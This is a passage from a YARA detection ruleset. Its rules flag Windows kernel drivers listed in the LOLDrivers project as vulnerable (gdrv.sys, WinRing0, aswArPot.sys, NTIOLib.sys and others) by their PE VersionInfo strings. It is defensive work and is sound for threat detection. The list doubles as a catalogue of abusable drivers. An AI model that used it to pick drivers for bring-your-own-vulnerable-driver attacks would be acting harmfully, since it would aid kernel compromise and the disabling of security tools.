\"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006c006600540065007300740020004400610074006100200043006f006c006c006500630074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007300740064006300640072007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530065006c006600540065007300740020004400610074006100200043006f006c006c006500630074006f0072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007300740064006300640072007600360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200049006e00740065006c00200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_2BBE_RID3707 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:21:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200046006f00720020004d0053004900530069006d0070006c0065005f004f0043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310031002d00320030003100320020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gigabytesoftwaredriver_092D_RID4454 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:48:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050006e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004900470041002d004200590054004500200053006f0066007400770061007200650020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrddkprovider_Rtportsys_Windowsrddkprovider_3C0A_RID42A9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtport.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:37:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065006e006500720069006300200050006f0072007400200049002f004f00200066006f0072002000570069006e00330032 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300033002000440044004b00200033003700390030002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0030002e0032003100390035002e0031003700310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0030002e0032003100390035002e0031003700310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300033002000440044004b00200033003700390030002000700072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d006900630072006f0073006f0066007400200043006f00720070002e00200032003000300035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_5FAE_RID3C99 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:18:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310031002e0030002e0030002e003300360032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310031002e0030002e0030002e003300360032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Vboxusbmonsys_Virtualboxusbmonitordriver_3D05_RID43D4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxUSBMon.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:27:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200055005300420020004d006f006e00690074006f00720020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005500530042004d006f006e002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200055005300420020004d006f006e00690074006f00720020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005500530042004d006f006e002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_1A45_RID3C73 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:12:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e00330037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e00330037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_62F5_RID3DAF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e0030002e0030002e0031003000390039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100360020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Yyinc_Dianhu_80CB_RID32D5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Dh_Kernel_10.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:22:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006400690061006e00680075 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0059005900200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00390039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00390039 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006400690061006e00680075 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300037002d003200300031003700200059005900200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_8F68_RID3BC1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:42:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003600200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_A5A5_RID3ECC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:52:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0033002e0033003800340038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0033002e0033003800340038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Wnbiossys_Windowsrwinddkdriver_530D_RID4442 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wnbios.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:45:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0057006e00420069006f00730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0077006e00620069006f0073002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0077006e00620069006f0073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytes_Elbycdio_Cdrtools_98EC_RID3B06 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:11:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f003200300030003000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200031002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002c00200030002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200045006c00610062006f007200610074006500200042007900740065007300200032003000300030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_591B_RID36ED : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:16:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200046006f00720020004d005300490052006100740069006f005f00430043 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Openlibsysorg_Winringsys_Winring_47EA_RID3B5E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinRing0.sys, WinRing0x64\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:26:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e00520069006e00670030 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e006f00720067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e00520069006e00670030002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e00520069006e00670030 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069006e00520069006e00670030002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000370020004f00700065006e004c00690062005300790073002e006f00720067002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftwarecorp_Segwindrvxsys_Segwindowsdriverx_6532_RID42FB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - segwindrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:51:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003100300030002e00300030002e00300037002e00300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003100300030002e00300030002e00300037002e00300032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100320020002d00200032003000310035002c00200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_909D_RID4BEF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:13:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300032003000200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Atitechnologiesinc_Atillksys_Atidiagnostics_AD40_RID3F9D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - atillk64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:27:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410054004900200044006900610067006e006f007300740069006300730020004800610072006400770061007200650020004100620073007400720061006300740069006f006e0020005300790073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410054004900200054006500630068006e006f006c006f006700690065007300200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00310031002e0039002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00310031002e0039002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100740069006c006c006b00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410054004900200044006900610067006e006f00730074006900630073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100740069006c006c006b00360034002e007300790073 } \n      $ = { 